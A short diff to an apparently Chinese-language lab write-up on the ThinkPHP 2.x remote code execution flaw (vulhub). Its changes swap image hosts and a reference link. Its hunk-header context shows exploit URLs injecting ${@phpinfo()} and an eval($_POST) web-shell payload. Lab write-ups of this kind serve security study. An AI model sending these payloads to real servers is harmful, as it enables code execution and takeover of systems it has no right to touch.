@@ -29,7 +29,7 @@ http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D
 
 
 
-![](http://cdn.laohuan.art/2020-06-13_15-57-09.png)
+![](http://qn.laohuan.xin/2020-06-13_15-57-09.png)
 
 
 
@@ -43,7 +43,7 @@ http://IP:8080/index.php?s=/index/index/name/${@print%28eval%28$_POST[1234]%29%2
 
 
 
-![](http://cdn.laohuan.art/2020-06-13_16-15-37.png)
+![](http://qn.laohuan.xin/2020-06-13_16-15-37.png)
 
 3.url编码
 
@@ -54,4 +54,4 @@ http://IP:8080/index.php?s=/index/index/name/${@print%28eval%28$_POST[1234]%29%2
 
 #### 参考链接
 
-<https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce/>
+<http://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce/>
